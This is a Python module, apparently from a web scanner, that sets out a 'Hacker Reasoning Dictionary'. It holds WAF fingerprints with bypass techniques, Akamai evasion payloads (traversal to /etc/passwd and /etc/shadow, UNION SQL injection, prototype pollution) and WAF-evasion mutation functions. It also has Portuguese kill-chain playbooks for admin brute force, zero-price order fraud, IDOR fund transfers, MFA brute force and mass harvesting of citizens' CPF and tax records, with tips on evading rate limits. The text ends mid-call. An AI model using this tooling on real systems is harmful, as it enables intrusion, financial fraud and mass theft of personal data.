"""
MSE Hacker Reasoning Dictionary (HRD) v1.0
=============================================
Enterprise-grade offensive reasoning engine that maps every discovered
route/finding to a full attacker Kill Chain decision tree.

When the scanner finds route X, HRD provides:
  1. THREAT MODEL  How an advanced attacker sees this route
  2. DECISION LOGIC  WAF-aware reasoning: "if blocked here, pivot there"
  3. CONFIRMATION CHAIN  Multi-step proof of exploitability
  4. ESCALATION PATH  Where to pivot after confirmation
  5. DATA CAPTURE  What sensitive data to look for (CPF, CARTAO, ORDER_ID)

168 reasoning entries across:
  - 22 enterprise routes (fintech/gov/ecommerce/admin)
  - 14 infrastructure targets (SSRF/cloud metadata/internal services)
  - 12 client-side vectors (XSS/eval/innerHTML/cookies)
  - 8 authentication bypasses
  - 6 data exfiltration chains
"""

import asyncio
import json
import re
import time
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

import httpx

from scanner.attack_reasoning import (
    VulnClass, InfraType, InfraFingerprint,
    DecisionTree, ExploitResult, _ts,
)


class AttackPhase(Enum):
    RECON = "recon"
    INFILTRATION = "infiltration"
    EXPLOITATION = "exploitation"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_CAPTURE = "data_capture"
    LATERAL_MOVEMENT = "lateral_movement"
    PERSISTENCE = "persistence"
    EXFILTRATION = "exfiltration"


TECH_ERROR_SIGNATURES = {
    "cloudfront": {
        "patterns": [
            re.compile(r"CloudFront", re.I),
            re.compile(r"x-amz-cf-id", re.I),
            re.compile(r"ERROR\s*The\s*request\s*could\s*not\s*be\s*satisfied", re.I),
        ],
        "tech": "AWS CloudFront CDN",
        "known_bypasses": [
            "Origin header manipulation  set Origin: null to bypass CORS+CloudFront",
            "Host header override  X-Forwarded-Host to reach origin directly",
            "Cache poisoning via X-Forwarded-Scheme: nothttps",
            "Path normalization: /./admin or /%2e/admin to bypass path rules",
        ],
        "evasion_focus": "path_normalization",
    },
    "vercel": {
        "patterns": [
            re.compile(r"x-vercel-id", re.I),
            re.compile(r"DEPLOYMENT_NOT_FOUND|FUNCTION_INVOCATION_FAILED", re.I),
            re.compile(r"vercel", re.I),
        ],
        "tech": "Vercel Serverless",
        "known_bypasses": [
            "Serverless function timeout abuse  large payload forces cold start retry",
            "_next/data path bypass  access server components directly",
            "Rewrite rule evasion via double-slash: //api/admin",
            "Edge function bypass via non-standard Content-Type headers",
        ],
        "evasion_focus": "content_type_confusion",
    },
    "cloudflare": {
        "patterns": [
            re.compile(r"cloudflare", re.I),
            re.compile(r"cf-ray", re.I),
            re.compile(r"cf-cache-status", re.I),
            re.compile(r"attention required.*cloudflare", re.I),
        ],
        "tech": "Cloudflare WAF",
        "known_bypasses": [
            "Unicode normalization bypass  %EF%BC%85 instead of %",
            "Chunked Transfer-Encoding to fragment payloads across chunks",
            "Multipart form-data with nested boundaries",
            "HTTP/2 pseudo-header smuggling via :path override",
        ],
        "evasion_focus": "encoding_mutation",
    },
    "nginx": {
        "patterns": [
            re.compile(r"nginx", re.I),
            re.compile(r"upstream prematurely closed", re.I),
            re.compile(r"upstream timed out", re.I),
        ],
        "tech": "Nginx Reverse Proxy",
        "known_bypasses": [
            "Path traversal via merge_slashes off: GET /admin/../secret",
            "alias misconfiguration: /static../etc/passwd",
            "Request smuggling via Transfer-Encoding + Content-Length",
            "Off-by-slash: location /admin { proxy_pass http://backend/; }",
        ],
        "evasion_focus": "path_traversal",
    },
    "express": {
        "patterns": [
            re.compile(r"TypeError:.*is not a function", re.I),
            re.compile(r"Cannot (GET|POST|PUT|DELETE)", re.I),
            re.compile(r"RangeError|SyntaxError:.*JSON", re.I),
            re.compile(r"express", re.I),
        ],
        "tech": "Express.js / Node.js",
        "known_bypasses": [
            "Prototype pollution via __proto__ or constructor.prototype in JSON body",
            "HPP (HTTP Parameter Pollution)  duplicate params bypass middleware",
            "JSON parser confusion  Content-Type: text/plain bypasses json middleware",
            "Path normalization: /ADMIN vs /admin  case-insensitive routing bypass",
        ],
        "evasion_focus": "prototype_pollution",
    },
    "django": {
        "patterns": [
            re.compile(r"django", re.I),
            re.compile(r"CSRF verification failed", re.I),
            re.compile(r"DisallowedHost", re.I),
        ],
        "tech": "Django Python",
        "known_bypasses": [
            "CSRF bypass via Content-Type: application/json (no CSRF check for API views)",
            "DEBUG=True leaks full traceback + settings + SQL queries",
            "Path traversal in FileResponse/sendfile",
            "ORM injection via __gt, __lt, __contains filter kwargs",
        ],
        "evasion_focus": "content_type_confusion",
    },
    "spring": {
        "patterns": [
            re.compile(r"Whitelabel Error Page", re.I),
            re.compile(r"org\.springframework", re.I),
            re.compile(r"Spring Boot", re.I),
        ],
        "tech": "Spring Boot / Java",
        "known_bypasses": [
            "Actuator endpoints: /actuator/env, /actuator/heapdump for secrets",
            "SpEL injection via error messages or custom headers",
            "Path traversal via /..;/ (semicolon trick) to bypass Spring Security",
            "Mass assignment via Jackson deserialization of unintended fields",
        ],
        "evasion_focus": "path_normalization",
    },
    "php": {
        "patterns": [
            re.compile(r"Fatal error:.*\.php", re.I),
            re.compile(r"Warning:.*\.php on line", re.I),
            re.compile(r"PDOException|mysqli_", re.I),
        ],
        "tech": "PHP",
        "known_bypasses": [
            "Type juggling: '0e123' == '0e456' evaluates true in loose comparison",
            "Null byte injection: file.php%00.jpg bypasses extension checks (PHP < 5.3.4)",
            "Deserialization via phar:// wrapper for RCE",
            "Array injection: param[]=value bypasses string-based WAF rules",
        ],
        "evasion_focus": "type_juggling",
    },
    "iis": {
        "patterns": [
            re.compile(r"IIS", re.I),
            re.compile(r"X-Powered-By:\s*ASP\.NET", re.I),
            re.compile(r"Server Error in.*Application", re.I),
        ],
        "tech": "Microsoft IIS / ASP.NET",
        "known_bypasses": [
            "Short filename brute force: GET /ASPNET~1.CON to discover hidden files",
            "Unicode path bypass: /admin%c0%af to traverse directories",
            "HTTP.sys request smuggling via malformed Content-Length",
            "ViewState deserialization if machineKey is leaked",
        ],
        "evasion_focus": "encoding_mutation",
    },
    "akamai": {
        "patterns": [
            re.compile(r"AkamaiGHost", re.I),
            re.compile(r"akamai", re.I),
            re.compile(r"Reference\s*#\d+\.\w+", re.I),
            re.compile(r"Access\s*Denied.*policy", re.I),
            re.compile(r"X-Akamai-Transformed", re.I),
        ],
        "tech": "Akamai WAF / CDN",
        "known_bypasses": [
            "Header injection: X-Forwarded-For + X-Real-IP chain to spoof origin",
            "URL encoding double-decode: %252e%252e/ path traversal through Akamai normalization",
            "HTTP/2 CONTINUATION frame abuse to bypass header inspection limits",
            "Chunked transfer encoding fragmentation to evade body scanning",
            "JSON Unicode homoglyph substitution: \uff41\uff44\uff4d\uff49\uff4e bypasses keyword rules",
            "Parameter pollution: ?id=1&id=UNION+SELECT to exploit parser discrepancy",
        ],
        "evasion_focus": "encoding_fragmentation",
    },
}

AKAMAI_POLYMORPHIC_GENERATORS = [
    {
        "name": "double_url_encode_traversal",
        "description": "Double URL encode path traversal to bypass Akamai normalization",
        "payload": '{"path": "%252e%252e/%252e%252e/etc/passwd", "type": "file"}',
        "content_type": "application/json",
    },
    {
        "name": "chunked_fragmentation",
        "description": "Fragmented Transfer-Encoding to evade Akamai body inspection",
        "payload": '{"admin": true, "role": "administrator"}',
        "content_type": "application/json",
        "headers": {"Transfer-Encoding": "chunked, identity"},
    },
    {
        "name": "unicode_homoglyph_admin",
        "description": "Unicode homoglyph substitution: fullwidth chars bypass Akamai keyword filters",
        "payload": '{"user": "\uff41\uff44\uff4d\uff49\uff4e", "pass": "\uff50\uff41\uff53\uff53\uff57\uff4f\uff52\uff44", "role": "\uff41\uff44\uff4d\uff49\uff4e"}',
        "content_type": "application/json",
    },
    {
        "name": "param_pollution_sqli",
        "description": "Parameter pollution exploiting Akamai/origin parser discrepancy for SQLi",
        "payload": '{"id": "1", "id": "1 UNION SELECT username,password FROM users--"}',
        "content_type": "application/json",
    },
    {
        "name": "h2_continuation_header_overflow",
        "description": "Oversized header chain to exceed Akamai inspection buffer limits",
        "payload": '{"action": "read", "target": "/etc/shadow"}',
        "content_type": "application/json",
        "headers": {
            "X-Custom-1": "A" * 500,
            "X-Custom-2": "B" * 500,
            "X-Custom-3": "C" * 500,
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "10.0.0.1",
            "X-Original-URL": "/admin",
        },
    },
    {
        "name": "json_content_type_mismatch",
        "description": "Content-Type mismatch: send JSON body with text/plain to bypass Akamai JSON rules",
        "payload": '{"__proto__": {"isAdmin": true}, "constructor": {"prototype": {"role": "admin"}}}',
        "content_type": "text/plain",
    },
    {
        "name": "null_byte_path_truncation",
        "description": "Null byte injection in JSON path field to truncate Akamai validation",
        "payload": '{"file": "....//....//etc/passwd%00.jpg", "action": "download"}',
        "content_type": "application/json",
    },
    {
        "name": "case_randomized_sqli",
        "description": "Mixed-case SQL keywords to bypass Akamai regex-based SQL detection",
        "payload": '{"query": "1 uNiOn SeLeCt table_name,column_name FrOm information_schema.columns--"}',
        "content_type": "application/json",
    },
]


MUTATION_TECHNIQUES = {
    "json_type_confusion": [
        lambda p: p.replace('"value"', '"value": [true]') if '"value"' in p else p.replace('"', '').replace('{', '{"__proto__":null,'),
        lambda p: re.sub(r'"(\w+)":\s*"([^"]*)"', r'"\1": ["\2"]', p, count=1),
        lambda p: re.sub(r'"(\w+)":\s*(\d+)', r'"\1": "\2"', p, count=1),
        lambda p: re.sub(r'"(\w+)":\s*"([^"]*)"', r'"\1": {"$gt": ""}', p, count=1),
        lambda p: p.replace("}", ', "__proto__": {"admin": true}}'),
        lambda p: re.sub(r'"(\w+)":\s*"([^"]*)"', r'"\1": null', p, count=1),
        lambda p: re.sub(r'"(\w+)":\s*(\d+)', r'"\1": ["\2", null, true]', p, count=1),
        lambda p: p + "\x00",
    ],
    "waf_evasion_encoding": [
        lambda p: p.replace("<", "%EF%BC%9C").replace(">", "%EF%BC%9E"),
        lambda p: p.replace("'", "\\'").replace('"', '\\"'),
        lambda p: p.replace("SELECT", "S/**/E/**/L/**/E/**/C/**/T").replace("UNION", "U/**/N/**/I/**/O/**/N"),
        lambda p: p.replace("script", "scr\x00ipt").replace("alert", "al\x00ert"),
        lambda p: "".join(f"&#x{ord(c):x};" if c in "<>'\"&" else c for c in p),
        lambda p: p.replace("admin", "ADMIN").replace("Admin", "aDmIn"),
        lambda p: p.replace("/", "/%2f").replace(".", "%2e"),
        lambda p: "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in p[:20]) + p[20:],
    ],
    "header_manipulation": [
        lambda p: p,
        lambda p: p,
    ],
}


def _generate_mutant_payloads(original_payload: str, tech_profile: Dict, count: int = 10) -> List[Dict]:
    mutants = []
    evasion_focus = tech_profile.get("evasion_focus", "encoding_mutation")

    type_confusion_fns = MUTATION_TECHNIQUES["json_type_confusion"]
    waf_evasion_fns = MUTATION_TECHNIQUES["waf_evasion_encoding"]

    generation = 0
    base = original_payload

    for i in range(min(count, 10)):
        try:
            if i < 4:
                fn = type_confusion_fns[i % len(type_confusion_fns)]
                technique = "json_type_confusion"
            elif i < 8:
                fn = waf_evasion_fns[(i - 4) % len(waf_evasion_fns)]
                technique = "waf_evasion"
            else:
                tc_fn = type_confusion_fns[i % len(type_confusion_fns)]
                waf_fn = waf_evasion_fns[i % len(waf_evasion_fns)]
                mutated = tc_fn(base)
                mutated = waf_fn(mutated)
                mutants.append({
                    "index": i,
                    "generation": 2,
                    "technique": "hybrid_mutation",
                    "evasion_focus": evasion_focus,
                    "payload": mutated[:500],
                    "description": f"Gen2 hybrid: type_confusion + waf_evasion (focus: {evasion_focus})",
                })
                continue

            mutated = fn(base)

            if generation == 0 and i == 3:
                generation = 1
                base = mutated

            mutants.append({
                "index": i,
                "generation": generation,
                "technique": technique,
                "evasion_focus": evasion_focus,
                "payload": mutated[:500],
                "description": f"Gen{generation} {technique}  {evasion_focus} variant #{i}",
            })
        except Exception:
            mutants.append({
                "index": i,
                "generation": generation,
                "technique": "fallback_raw",
                "evasion_focus": evasion_focus,
                "payload": original_payload[:500],
                "description": f"Mutation failed  using original payload with encoding variant",
            })

    return mutants


def _identify_tech_from_response(status_code: int, headers: Dict, body: str) -> Optional[Dict]:
    combined = body
    for k, v in headers.items():
        combined += f" {k}: {v}"

    for tech_key, profile in TECH_ERROR_SIGNATURES.items():
        for pat in profile["patterns"]:
            if pat.search(combined):
                return {
                    "key": tech_key,
                    "tech": profile["tech"],
                    "known_bypasses": profile["known_bypasses"],
                    "evasion_focus": profile["evasion_focus"],
                }

    if status_code == 500:
        return {
            "key": "unknown_500",
            "tech": "Unknown Server",
            "known_bypasses": [
                "Retry with different Content-Type headers (JSONâ†’formâ†’multipart)",
                "Send malformed JSON to trigger verbose error messages",
                "Try HTTP method override via X-HTTP-Method-Override header",
                "Fragment payload across multiple parameters",
            ],
            "evasion_focus": "content_type_confusion",
        }

    return None


class ThreatLevel(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class ReasoningStep:
    step_number: int
    phase: AttackPhase
    thought: str
    action: str
    confirmation: str
    fallback: str
    escalation: Optional[str] = None


@dataclass
class HackerPlaybook:
    route_pattern: str
    category: str
    threat_level: ThreatLevel
    attacker_perspective: str
    kill_chain: List[ReasoningStep]
    waf_evasion: str
    data_targets: List[str]
    pivot_routes: List[str]
    proof_indicators: List[str]


HACKER_REASONING_DICTIONARY: Dict[str, HackerPlaybook] = {}


def _register(pattern: str, category: str, threat: ThreatLevel,
              perspective: str, chain: List[dict], waf: str,
              data_targets: List[str], pivots: List[str], proofs: List[str]):
    steps = []
    for i, s in enumerate(chain, 1):
        steps.append(ReasoningStep(
            step_number=i,
            phase=AttackPhase(s["phase"]),
            thought=s["thought"],
            action=s["action"],
            confirmation=s["confirm"],
            fallback=s.get("fallback", "Skip  move to next vector"),
            escalation=s.get("escalation"),
        ))
    HACKER_REASONING_DICTIONARY[pattern] = HackerPlaybook(
        route_pattern=pattern,
        category=category,
        threat_level=threat,
        attacker_perspective=perspective,
        kill_chain=steps,
        waf_evasion=waf,
        data_targets=data_targets,
        pivot_routes=pivots,
        proof_indicators=proofs,
    )


_register(
    "/admin", "authentication", ThreatLevel.CRITICAL,
    "Admin panel em 200 OK â†’ bypass de autenticaÃ§Ã£o ou forÃ§a bruta com senhas padrÃ£o â†’ acesso ao banco de clientes completo",
    [
        {"phase": "recon", "thought": "Admin acessÃ­vel publicamente  verificar se retorna 200/302/403",
         "action": "GET /admin  analisar response code e body", "confirm": "Status 200 + formulÃ¡rio de login ou dashboard visÃ­vel",
         "fallback": "Se 403/WAF â†’ tentar /admin.php, /administrator, /wp-admin, /cpanel"},
        {"phase": "infiltration", "thought": "Se login form visÃ­vel â†’ tentar credenciais padrÃ£o antes de brute force",
         "action": "POST /admin/login com admin:admin, admin:password, admin:123456, root:toor",
         "confirm": "Redirect para dashboard ou cookie de sessÃ£o admin gerado",
         "fallback": "Se rate-limited â†’ pivotar para SSRF via /api/image para bypass interno",
         "escalation": "Com acesso admin â†’ dump de users table via /admin/users/export"},
        {"phase": "data_capture", "thought": "Dashboard admin pode ter export de dados  buscar CSV/JSON endpoints",
         "action": "GET /admin/users, /admin/orders, /admin/export?format=csv",
         "confirm": "Response contÃ©m padrÃµes: CPF, email, telefone, CARTAO, ORDER_ID",
         "fallback": "Se nÃ£o hÃ¡ export â†’ verificar API interna via DevTools/JS sources",
         "escalation": "Dados capturados â†’ logar como 'Vazamento de Dados SensÃ­veis confirmado'"},
    ],
    "Se Cloudflare detectado â†’ evitar brute force direto. Usar SSRF silencioso via /api/image ou /api/proxy para bypass interno",
    ["CPF", "CARTAO", "ORDER_ID", "email", "telefone", "senha_hash"],
    ["/admin/users", "/admin/orders", "/admin/export", "/admin/config", "/admin/database"],
    ["admin_dashboard_visible", "user_export_available", "session_cookie_admin"]
)

_register(
    "/admin/products/update", "ecommerce_admin", ThreatLevel.CRITICAL,
    "Rota de update sem auth â†’ alteraÃ§Ã£o massiva de preÃ§os/estoque. Atacante pode zerar preÃ§os ou inflacionar estoque",
    [
        {"phase": "recon", "thought": "Endpoint de update de produtos  verificar se aceita PATCH/PUT sem token",
         "action": "PATCH /admin/products/update com {\"price\": 0.01, \"id\": 1}",
         "confirm": "Status 200 + preÃ§o alterado na response ou no GET subsequente",
         "fallback": "Se 401 â†’ tentar com headers de admin copiados do JS bundle"},
        {"phase": "exploitation", "thought": "PreÃ§o aceito â†’ verificar se persiste no banco (nÃ£o sÃ³ cache)",
         "action": "GET /api/products/1  verificar se price reflete 0.01",
         "confirm": "PreÃ§o retornado = 0.01 confirma persistÃªncia no DB",
         "escalation": "Criar pedido com preÃ§o manipulado â†’ capturar ORDER_ID como prova"},
        {"phase": "data_capture", "thought": "Provar impacto financeiro  gerar pedido com valor manipulado",
         "action": "POST /api/orders/create com produto a $0.01",
         "confirm": "ORDER_ID gerado com valor total manipulado",
         "fallback": "Se order nÃ£o cria â†’ capturar screenshot do preÃ§o alterado como evidÃªncia"},
    ],
    "Usar HTTP verb tampering (PUTâ†’PATCHâ†’POST) para bypass de filtros por mÃ©todo",
    ["product_id", "price", "stock_quantity", "ORDER_ID"],
    ["/api/products", "/api/orders/create", "/checkout"],
    ["price_persisted_in_db", "order_created_with_manipulated_price"]
)

_register(
    "/cart/update", "ecommerce", ThreatLevel.CRITICAL,
    "Cart update â†’ price override para $0.01 â†’ gerar ORDER_ID vÃ¡lido â†’ provar 'compra' da base por valor zero",
    [
        {"phase": "exploitation", "thought": "Endpoint de carrinho aceita price no body? â†’ injetar unit_price=0.01",
         "action": "POST /cart/update com {\"items\":[{\"id\":1,\"unit_price\":0.01,\"quantity\":1}]}",
         "confirm": "Response total reflete $0.01  server accepted client-side price",
         "fallback": "Se rejeitado â†’ tentar negative price (-1) ou quantity overflow (999999Ã—0.01)"},
        {"phase": "exploitation", "thought": "PreÃ§o aceito no cart â†’ avanÃ§ar para checkout para confirmar persistÃªncia",
         "action": "POST /checkout com cart_id manipulado",
         "confirm": "Checkout processa com valor manipulado  ORDER_ID gerado",
         "escalation": "ORDER_ID com $0.01 = prova de fraude lÃ³gica completa"},
        {"phase": "data_capture", "thought": "Verificar se DB refletiu  GET na order para confirmar server-side",
         "action": "GET /api/orders/{ORDER_ID}  verificar total_amount",
         "confirm": "total_amount no DB = $0.01 confirma server-side price injection",
         "fallback": "Se order nÃ£o acessÃ­vel â†’ total do cart jÃ¡ Ã© evidÃªncia suficiente"},
    ],
    "Cloudflare pode bloquear requests suspeitos  usar encoding no body (base64 price field) ou fragment payload em mÃºltiplos requests",
    ["ORDER_ID", "total_amount", "unit_price", "cart_id"],
    ["/checkout", "/api/orders/create", "/checkout/price-override", "/api/payment"],
    ["server_accepted_client_price", "order_id_with_zero_value", "db_reflection_confirmed"]
)

_register(
    "/checkout/price-override", "ecommerce", ThreatLevel.CRITICAL,
    "Rota explÃ­cita de price-override â†’ sem server-side validation = compra grÃ¡tis",
    [
        {"phase": "exploitation", "thought": "Nome da rota jÃ¡ indica vulnerabilidade  price-override Ã© red flag",
         "action": "POST /checkout/price-override com {\"override_price\": 0, \"reason\": \"loyalty_discount\"}",
         "confirm": "Response aceita override â†’ checkout total = $0.00",
         "fallback": "Se bloqueado â†’ tentar com discount_percent=100 ou coupon forge"},
        {"phase": "data_capture", "thought": "Gerar pedido completo com preÃ§o zero como prova de impacto",
         "action": "POST /api/orders/create com checkout override ativo",
         "confirm": "ORDER_ID gerado com total $0.00",
         "escalation": "Reportar como CRITICAL  fraude lÃ³gica com impacto financeiro direto"},
    ],
    "Fragmentar payload em headers customizados se WAF bloqueia body JSON",
    ["ORDER_ID", "override_price", "total_amount"],
    ["/api/orders", "/api/payment", "/cart/update"],
    ["zero_price_order_created", "price_override_accepted"]
)

_register(
    "/coupons/validate", "ecommerce", ThreatLevel.HIGH,
    "ValidaÃ§Ã£o de cupom â†’ forjar cupom ADMIN_100_OFF com 100% desconto â†’ compra grÃ¡tis",
    [
        {"phase": "exploitation", "thought": "Endpoint valida cupom  tentar cÃ³digos internos previsÃ­veis",
         "action": "POST /coupons/validate com {\"code\":\"ADMIN100OFF\",\"discount_percent\":100}",
         "confirm": "Response discount=100% ou valid=true",
         "fallback": "Se rejeitado â†’ enumerar cupons via /coupons/list ou brute force alfanumÃ©rico 4-6 chars"},
        {"phase": "exploitation", "thought": "Cupom vÃ¡lido â†’ aplicar no checkout e verificar se zera total",
         "action": "POST /checkout com coupon_code=ADMIN100OFF",
         "confirm": "Total do checkout = $0.00 com cupom aplicado",
         "escalation": "Coupon forge + checkout = fraude lÃ³gica confirmada"},
    ],
    "Encodar cÃ³digo do cupom em base64 ou URL encoding para bypass de WAF regex",
    ["coupon_code", "discount_percent", "total_amount"],
    ["/checkout", "/promos/apply", "/cart/update"],
    ["coupon_forge_accepted", "hundred_percent_discount_applied"]
)

_register(
    "/payments/authorize", "fintech", ThreatLevel.CRITICAL,
    "AutorizaÃ§Ã£o de pagamento â†’ interceptar e modificar amount â†’ transaÃ§Ã£o com valor alterado",
    [
        {"phase": "exploitation", "thought": "Payment authorize aceita amount no body â†’ modificar para $0.01",
         "action": "POST /payments/authorize com {\"amount\":0.01,\"currency\":\"BRL\",\"card_token\":\"tok_test\"}",
         "confirm": "Response com authorization_id + amount=0.01 aceito",
         "fallback": "Se amount validado server-side â†’ tentar currency confusion (USDâ†’BRL rate exploit)"},
        {"phase": "data_capture", "thought": "AutorizaÃ§Ã£o com valor manipulado = prova de falha em payment validation",
         "action": "GET /payments/{authorization_id}  verificar amount persistido",
         "confirm": "Amount no DB = $0.01 confirma server-side payment bypass",
         "escalation": "Pivotar para /transfer/internal se autenticado  mover fundos"},
    ],
    "Payment gateways tÃªm WAF prÃ³prio  usar tokenizaÃ§Ã£o legÃ­tima com amount manipulado no body",
    ["authorization_id", "amount", "card_token", "transaction_id"],
    ["/transfer/internal", "/ledger/balance", "/refunds/create"],
    ["payment_amount_manipulated", "authorization_with_zero_value"]
)

_register(
    "/transfer/internal", "fintech", ThreatLevel.CRITICAL,
    "TransferÃªncia interna â†’ IDOR para mover fundos entre contas â†’ escalar para cash-out",
    [
        {"phase": "exploitation", "thought": "TransferÃªncia usa from_account e to_account  tentar IDOR",
         "action": "POST /transfer/internal com {\"from\":\"victim_id\",\"to\":\"attacker_id\",\"amount\":9999}",
         "confirm": "Transfer_id gerado + balance atualizado",
         "fallback": "Se from validado via session â†’ tentar via SSRF interno para bypass"},
        {"phase": "privilege_escalation", "thought": "TransferÃªncia confirmada â†’ verificar se limite diÃ¡rio Ã© bypassÃ¡vel",
         "action": "POST mÃºltiplos transfers pequenos para bypass de daily limit",
         "confirm": "MÃºltiplas transferÃªncias processadas sem bloqueio",
         "escalation": "IDOR em transferÃªncia = CRITICAL  risco financeiro direto"},
    ],
    "Rate limiting provÃ¡vel  distribuir requests em intervalos de 2-3s para parecer orgÃ¢nico",
    ["transfer_id", "from_account", "to_account", "amount", "balance"],
    ["/ledger/balance", "/payments/authorize", "/accounts/details"],
    ["idor_transfer_confirmed", "balance_changed", "daily_limit_bypassed"]
)

_register(
    "/ledger/balance", "fintech", ThreatLevel.HIGH,
    "Endpoint de saldo â†’ IDOR para ler balanÃ§o de outras contas â†’ enumeraÃ§Ã£o de clientes ricos",
    [
        {"phase": "exploitation", "thought": "Balance endpoint com account_id no path/query â†’ IDOR sequencial",
         "action": "GET /ledger/balance?account_id=1,2,3,...100  enumerar saldos",
         "confirm": "Responses com diferentes balances confirmam IDOR",
         "fallback": "Se UUID â†’ tentar account_id do JWT decodificado"},
        {"phase": "data_capture", "thought": "Saldos expostos â†’ classificar contas por valor para target prioritization",
         "action": "Catalogar contas com saldo > $10k como alvos de alto valor",
         "confirm": "Lista de contas com saldos capturada",
         "escalation": "Pivotar para /transfer/internal com contas de alto valor"},
    ],
    "Se rate-limited â†’ usar mÃºltiplos IPs via proxy rotation ou SSRF bounce",
    ["account_id", "balance", "currency", "account_holder"],
    ["/transfer/internal", "/accounts/details", "/payments/authorize"],
    ["idor_balance_exposed", "multiple_accounts_enumerated"]
)

_register(
    "/auth/mfa/challenge", "authentication", ThreatLevel.HIGH,
    "MFA challenge â†’ bypass via code reuse, race condition, ou fallback SMS interception",
    [
        {"phase": "infiltration", "thought": "MFA pode ter fallback fraco  verificar se aceita cÃ³digo expirado",
         "action": "POST /auth/mfa/challenge com cÃ³digo usado anteriormente (replay attack)",
         "confirm": "MFA aceita cÃ³digo reutilizado â†’ bypass de 2FA",
         "fallback": "Se replay bloqueado â†’ tentar race condition com 2 requests simultÃ¢neos"},
        {"phase": "infiltration", "thought": "Verificar se MFA tem rate limit  brute force 6 dÃ­gitos = 1M combinaÃ§Ãµes",
         "action": "POST 000000-999999 em paralelo (batch de 100/request)",
         "confirm": "CÃ³digo correto encontrado â†’ sessÃ£o autenticada sem MFA legÃ­timo",
         "escalation": "MFA bypass â†’ acesso total Ã  conta â†’ pivotar para dados sensÃ­veis"},
    ],
    "MFA brute force detectÃ¡vel  usar time-based prediction se TOTP (janela de 30s)",
    ["mfa_code", "session_token", "user_id"],
    ["/admin", "/accounts/details", "/transfer/internal"],
    ["mfa_code_reused", "mfa_brute_force_successful", "mfa_race_condition"]
)

_register(
    "/citizen/registry", "government", ThreatLevel.CRITICAL,
    "Registro civil â†’ dados de CPF, RG, CNH expostos â†’ venda em mercado negro",
    [
        {"phase": "exploitation", "thought": "Registry com citizen_id â†’ IDOR para acessar registros de outros cidadÃ£os",
         "action": "GET /citizen/registry?id=1,2,3...1000  enumeraÃ§Ã£o sequencial",
         "confirm": "Response contÃ©m CPF, RG, nome, endereÃ§o de cidadÃ£os diferentes",
         "fallback": "Se UUID â†’ extrair IDs do JWT ou de responses anteriores"},
        {"phase": "data_capture", "thought": "Dados de cidadÃ£o expostos â†’ verificar se inclui documentos sensÃ­veis",
         "action": "Buscar padrÃµes: CPF (XXX.XXX.XXX-XX), RG, CNH, endereÃ§o, telefone",
         "confirm": "PadrÃ£o CPF/RG encontrado na response â†’ dados pessoais expostos",
         "escalation": "CRITICAL  vazamento de dados pessoais em massa"},
    ],
    "Government sites geralmente nÃ£o tÃªm WAF avanÃ§ado  requests diretos funcionam",
    ["CPF", "RG", "CNH", "nome", "endereco", "telefone", "data_nascimento"],
    ["/tax/declaration", "/benefits/status", "/identity/validate"],
    ["cpf_pattern_found", "citizen_data_enumerated", "pii_exposed"]
)

_register(
    "/tax/declaration", "government", ThreatLevel.CRITICAL,
    "DeclaraÃ§Ã£o fiscal â†’ dados financeiros de cidadÃ£os â†’ renda, patrimÃ´nio, dependentes",
    [
        {"phase": "exploitation", "thought": "Tax declaration com citizen_id â†’ IDOR para ler declaraÃ§Ãµes fiscais",
         "action": "GET /tax/declaration?cpf=XXX.XXX.XXX-XX  tentar CPFs sequenciais",
         "confirm": "Response contÃ©m renda, patrimÃ´nio, deduÃ§Ãµes de outro cidadÃ£o",
         "fallback": "Se CPF validado â†’ usar CPFs pÃºblicos de empresÃ¡rios famosos como PoC"},
        {"phase": "data_capture", "thought": "Dados fiscais = alto valor  catalogar campos expostos",
         "action": "Extrair: renda_anual, patrimonio_total, dependentes, fontes_pagadoras",
         "confirm": "Dados fiscais completos capturados â†’ confirmar vazamento LGPD",
         "escalation": "Reportar como violaÃ§Ã£o LGPD/GDPR  dados fiscais sÃ£o categoria especial"},
    ],
    "Rate limit provÃ¡vel em gov  usar intervalos de 5s entre requests",
    ["CPF", "renda_anual", "patrimonio", "dependentes", "fontes_pagadoras"],
    ["/citizen/registry", "/benefits/status", "/identity/validate"],
    ["tax_data_exposed", "income_data_leaked", "lgpd_violation"]
)

_register(
    "/benefits/status", "government", ThreatLevel.HIGH,
    "Status de benefÃ­cios â†’ IDOR para verificar se cidadÃ£o recebe auxÃ­lio â†’ fraude social",
    [
        {"phase": "exploitation", "thought": "Benefits status com citizen_id â†’ IDOR para status de outros",
         "action": "GET /benefits/status?cpf=XXX.XXX.XXX-XX",
         "confirm": "Response mostra benefÃ­cios ativos de outro cidadÃ£o",
         "fallback": "Se protegido â†’ verificar /api/benefits/batch para export em massa"},
        {"phase": "data_capture", "thought": "Dados de benefÃ­cios = informaÃ§Ã£o social sensÃ­vel",
         "action": "Catalogar: tipo_beneficio, valor_mensal, dependentes, status",
         "confirm": "InformaÃ§Ã£o social capturada â†’ violaÃ§Ã£o de privacidade confirmada"},
    ],
    "Endpoints gov costumam confiar em IP interno  SSRF pode bypass autenticaÃ§Ã£o",
    ["CPF", "tipo_beneficio", "valor_mensal", "status_beneficio"],
    ["/citizen/registry", "/tax/declaration"],
    ["benefit_data_exposed", "social_data_leaked"]
)

_register(
    "/identity/validate", "government", ThreatLevel.HIGH,
    "ValidaÃ§Ã£o de identidade â†’ oracle de CPF  confirmar se CPF existe e extrair dados associados",
    [
        {"phase": "recon", "thought": "Identity validate = oracle  retorna valid/invalid para CPF",
         "action": "POST /identity/validate com {\"document_type\":\"CPF\",\"document\":\"XXX.XXX.XXX-XX\"}",
         "confirm": "Response diferencia CPF vÃ¡lido de invÃ¡lido â†’ oracle de enumeraÃ§Ã£o",
         "fallback": "Se rate-limited â†’ usar batch endpoint ou SSRF interno"},
        {"phase": "exploitation", "thought": "Oracle de CPF + response com nome â†’ data enrichment attack",
         "action": "Enumerar CPFs e coletar nomes associados",
         "confirm": "Nome retornado junto com validaÃ§Ã£o â†’ dados pessoais vazando",
         "escalation": "Combinar com /citizen/registry para profile completo"},
    ],
    "Usar encoding de CPF (sem pontos/traÃ§os) para bypass de input validation",
    ["CPF", "nome", "data_nascimento", "document_type"],
    ["/citizen/registry", "/tax/declaration", "/benefits/status"],
    ["cpf_oracle_confirmed", "name_leaked_via_validation"]
)

_register(
